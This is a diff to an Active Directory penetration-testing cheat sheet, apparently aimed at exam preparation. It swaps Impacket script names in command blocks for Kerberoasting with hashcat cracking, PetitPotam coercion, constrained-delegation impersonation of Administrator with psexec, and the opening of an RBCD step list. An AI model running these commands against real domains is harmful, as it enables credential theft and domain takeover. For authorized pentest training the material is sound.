@@ -115,11 +115,11 @@ bloodyAD --host <DC_IP> -d <domain.local> -u <user> -p '<pass>' get writable
 
 ```bash
 # Request/crack TGS for accounts with SPNs
-GetUserSPNs.py <domain.local>/<user>:<pass> -request -outputfile kerberoast.hash
+impacket-GetUserSPNs <domain.local>/<user>:<pass> -request -outputfile kerberoast.hash
 hashcat -m 13100 kerberoast.hash rockyou.txt
 
 # Target only high-value SPNs (skip noise, exam-friendly)
-GetUserSPNs.py <domain.local>/<user>:<pass> -request-user <svc_account>
+impacket-GetUserSPNs <domain.local>/<user>:<pass> -request-user <svc_account>
 ```
 
 **Decision point:** cracked SPN account → check its group memberships in BloodHound before doing anything else; service accounts are frequently over-privileged (DA nested, or local admin on a target).
@@ -163,7 +163,7 @@ python3 PetitPotam.py -u <user> -p '<pass>' <listener_ip> <DC_IP>
 # Constrained delegation (S4U2Self/S4U2Proxy)
 getST.py -spn <target_SPN> -impersonate Administrator <domain.local>/<svc_account>:'<pass>'
 export KRB5CCNAME=Administrator.ccache
-psexec.py -k -no-pass <domain.local>/Administrator@<target_host>
+impacket-psexec -k -no-pass <domain.local>/Administrator@<target_host>
 
 # Resource-Based Constrained Delegation (RBCD) — needs GenericWrite/GenericAll on target computer object
 # 1. Add a fake computer account (if MachineAccountQuota > 0)
